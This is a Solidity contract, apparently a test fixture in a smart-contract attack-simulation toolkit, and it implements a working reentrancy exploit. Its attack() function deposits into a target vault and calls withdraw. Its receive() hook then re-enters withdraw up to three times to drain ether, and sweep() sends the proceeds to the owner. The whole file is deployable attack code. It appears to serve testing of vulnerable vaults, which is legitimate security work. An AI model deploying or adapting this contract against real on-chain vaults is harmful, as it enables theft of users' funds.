// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

interface IVaultLike {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Static hand-written twin of what attack_library/reentrancy/
/// attacker_template.sol.j2 would generate for the bundled demo scenario.
/// Kept here, non-generated, so `forge test` works standalone without
/// running the Python compiler first.
contract MaliciousReceiver_demo {
    IVaultLike public immutable target;
    address public immutable owner;
    uint256 public reentryCount;
    uint256 public constant MAX_REENTRIES = 3;

    constructor(address _target) {
        target = IVaultLike(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "not owner");
        if (msg.value > 0) {
            target.deposit{value: msg.value}();
        }
        target.withdraw();
    }

    receive() external payable {
        if (reentryCount < MAX_REENTRIES && address(target).balance >= msg.value) {
            reentryCount += 1;
            target.withdraw();
        }
    }

    function sweep() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
